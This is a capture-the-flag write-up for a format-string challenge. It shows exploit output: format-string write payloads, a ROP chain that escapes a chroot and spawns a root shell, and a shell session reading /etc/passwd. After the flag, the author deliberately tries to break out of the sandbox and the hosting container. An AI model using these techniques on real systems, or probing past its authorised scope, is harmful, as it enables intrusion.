# Queen's Gambit

Typical format string vuln task. Solution in solve.py.

After getting a shell and flag I looked around and it was like a chroot sandbox. So why not to bypass it and maybe find something more interesing?

As there were no too much binaries inside I could use to get out of chroot I modified an exploit to call mkdir, chroot and execve. The code is in pwn_tenable.py (code and outputs are a bit ugly, but it works)

```
[*] '/root/chess'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenges.ctfd.io on port 30458: Done
[*] '/root/libc6_2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] stack = 0x7ffdc52dfe30
[*] STAAAACK 0x7ffdc52dfe30
[+] stack = 0x7ffdc52dfd60
[*] stack = 0x7ffdc52dfd60
[*] STAAAACK 0x7ffdc52dfd60
[+] stack = 0x7ffdc52dfc90
[*] stack = 0x7ffdc52dfc90
[*] STAAAACK 0x7ffdc52dfc90
[+] stack = 0x7ffdc52dfbc0
[!] 0x7f54bf501840
[*] STAAAACK 0x7ffdc52dfbc0
[+] stack = 0x7ffdc52dfaf0
[+] libc = 0x7f54bf4e1000
[*] GETS = 0x7f54bf54fd90
[*] stack = 0x7ffdc52dfaf0
[*] STAAAACK 0x7ffdc52dfaf0
[+] stack = 0x7ffdc52dfa20
[+] ret_at = 0x7ffdc52dfac8
[+] fmt_ret_at = 0x7ffdc52df9e8
[*] 0x7f54bf54fd90
[!] writing 0xfd90 to 0x404040
[*] b'%64824c%25$llnaa@@@\x00\x00\x00\x00\x00'
[*] b'%64824c%25$hnaaa@@@\x00\x00\x00\x00\x00'
[*] STAAAACK 0x7ffdc52dfa20
[*] stack = 0x7ffdc52df950
[*] rop_buff = 0x7ffdc52df9f8
[*] Loading gadgets for '/root/libc6_2.23.so'
0x7ffdc52df9f8:   0x7f54bf502112 pop rdi; ret
0x7ffdc52dfa00:   0x7ffdc52dfa80 [arg0] rdi = AppendedArgument(['.t2'], 0x0) (+0x80)
0x7ffdc52dfa08:   0x7f54bf5012f8 pop rsi; ret
0x7ffdc52dfa10:            0x2f3 [arg1] rsi = 755
0x7ffdc52dfa18:   0x7f54bf5d8090 mkdir
0x7ffdc52dfa20:   0x7f54bf502112 pop rdi; ret
0x7ffdc52dfa28:   0x7ffdc52dfa88 [arg0] rdi = AppendedArgument(['.t2'], 0x0) (+0x60)
0x7ffdc52dfa30:   0x7f54bf5de7f0 chroot
0x7ffdc52dfa38:   0x7f54bf502112 pop rdi; ret
0x7ffdc52dfa40:   0x7ffdc52dfa90 [arg0] rdi = AppendedArgument(['../../../../../../../../../../../../../../../..'], 0x0) (+0x50)
0x7ffdc52dfa48:   0x7f54bf5de7f0 chroot
0x7ffdc52dfa50:   0x7f54bf5f6189 pop rdx; pop rsi; ret
0x7ffdc52dfa58:              0x0 [arg2] rdx = 0
0x7ffdc52dfa60:   0x7ffdc52dfac0 [arg1] rsi = AppendedArgument(['-i'], 0x0) (+0x60)
0x7ffdc52dfa68:   0x7f54bf502112 pop rdi; ret
0x7ffdc52dfa70:   0x7ffdc52dfac8 [arg0] rdi = AppendedArgument(['/bin/sh'], 0x0) (+0x58)
0x7ffdc52dfa78:   0x7f54bf5adaa0 execl
0x7ffdc52dfa80:   b'.t2\x00$$$$'
0x7ffdc52dfa88:   b'.t2\x00$$$$'
0x7ffdc52dfa90: b'../../../../../../../../../../../../../../../..\x00'
0x7ffdc52dfac0:   b'-i\x00$$$$$'
0x7ffdc52dfac8:   b'/bin/sh\x00'
b'122150bf547f000080fa2dc5fd7f0000f81250bf547f0000f30200000000000090805dbf547f0000122150bf547f000088fa2dc5fd7f0000f0e75dbf547f0000122150bf547f000090fa2dc5fd7f0000f0e75dbf547f000089615fbf547f00000000000000000000c0fa2dc5fd7f0000122150bf547f0000c8fa2dc5fd7f0000a0da5abf547f00002e743200242424242e743200242424242e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e002d690024242424242f62696e2f736800'
[*] Switching to interactive mode


>> 
Quitting!
# $ id
uid=0(root) gid=0(root) groups=0(root)
# $ ls -la
total 64
drwxr-xr-x 1 ctf  ctf   4096 Feb 22 11:17 .
drwxr-xr-x 1 root root  4096 Jan 18 18:37 ..
-rwxr-xr-x 1 ctf  ctf    220 Aug 31  2015 .bash_logout
-rwxr-xr-x 1 ctf  ctf   3771 Aug 31  2015 .bashrc
-rwxr-xr-x 1 ctf  ctf    655 Jul 12  2019 .profile
d-wxr----t 2 root root  4096 Feb 22 11:17 .t2
drwxr-xr-x 1 ctf  ctf   4096 Jan 19 14:37 bin
-rwxr-xr-x 1 ctf  ctf  14648 Jan 19 16:07 chess
drwxr-xr-x 1 ctf  ctf   4096 Jan 19 14:04 dev
-rwxr--r-- 1 ctf  ctf     40 Jan 18 18:11 flag.txt
drwxr-xr-x 1 ctf  ctf   4096 Jan 19 14:04 lib
drwxr-xr-x 1 ctf  ctf   4096 Jan 19 14:04 lib32
drwxr-xr-x 1 ctf  ctf   4096 Jan 19 14:04 lib64
# $ pwd
/home/ctf
# $ cd /
# $ ls -la
total 80
drwxr-xr-x   1 root   root    4096 Feb 20 19:44 .
drwxr-xr-x   1 root   root    4096 Feb 20 19:44 ..
-rwxr-xr-x   1 root   root       0 Feb 20 19:44 .dockerenv
drwxr-xr-x   1 root   root    4096 Jan 18 18:37 bin
drwxr-xr-x   2 root   root    4096 Apr 12  2016 boot
drwxr-xr-x   5 root   root     360 Feb 20 19:44 dev
drwxr-xr-x   1 root   root    4096 Feb 20 19:44 etc
drwxr-xr-x   1 root   root    4096 Jan 18 18:37 home
drwxr-xr-x   1 root   root    4096 Jan 18 18:37 lib
drwxr-xr-x   2 root   root    4096 Jan 18 18:37 lib32
drwxr-xr-x   2 root   root    4096 Oct 30 15:53 lib64
drwxr-xr-x   2 root   root    4096 Oct 30 15:50 media
drwxr-xr-x   2 root   root    4096 Oct 30 15:50 mnt
drwxr-xr-x   2 root   root    4096 Oct 30 15:50 opt
dr-xr-xr-x 728 nobody nogroup    0 Feb 20 19:44 proc
drwx------   2 root   root    4096 Oct 30 15:53 root
drwxr-xr-x   1 root   root    4096 Oct 30 15:53 run
drwxr-xr-x   1 root   root    4096 Jan 18 18:37 sbin
drwxr-xr-x   2 root   root    4096 Oct 30 15:50 srv
-rwxr-xr-x   1 root   root     185 Jan 19 15:53 start.sh
dr-xr-xr-x  13 nobody nogroup    0 Aug  6  2020 sys
drwxrwxrwt   1 root   root    4096 Jan 18 18:37 tmp
drwxr-xr-x   1 root   root    4096 Jan 18 18:37 usr
drwxr-xr-x   1 root   root    4096 Oct 30 15:53 var
# $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
ctf:x:1000:1000::/home/ctf:

```

Turned out it's docker container. Tried to get something useful and escape the container but coudn't.
